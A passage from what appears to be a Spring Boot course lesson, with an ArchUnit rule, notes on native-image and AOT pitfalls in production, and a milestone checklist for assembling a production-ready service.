    static final ArchRule domainIsPlainJava = noClasses().that().resideInAPackage("..domain..")
            .should().dependOnClassesThat().resideInAPackage("org.springframework..");
}
What breaks in production
  • Native passes tests, fails in prod: tests ran on the JVM; a reflective path used only in production has no hint. Run the native test suite (-PnativeTest) in CI.
  • Profile switch ignored: an AOT-built artifact keeps the bean graph of its build-time profile; activating another profile at run time does not add or remove beans.

Milestone: a production-shaped Boot service

Assemble the phase into one service and tick every item:

  • Layout above with a green ArchitectureTest; main class in the root package.
  • Layered config: base application.yml, dev/prod profile groups, validated @ConfigurationProperties records, secrets only from env or a config tree (L282–L284).
  • Custom HealthIndicator for one downstream with timeouts; liveness and readiness groups; Actuator on a separate, secured port with build and git info (L291, L292).
  • Structured JSON logs with a request or trace id in every line, and runtime level changes via /loggers (L288).
  • The acme-audit starter from L286 consumed from a separate build, with @Auditable on at least two use cases.
  • Graceful shutdown with a documented preStop delay and grace period (L296).
  • Tests: unit, @WebMvcTest, @DataJpaTest on Postgres, and one @SpringBootTest that starts the prod profile; one shared cached context (L293, L294).
  • Layered container image or buildpack image; startup time and memory recorded for JVM, JVM with CDS, and (optional) native.
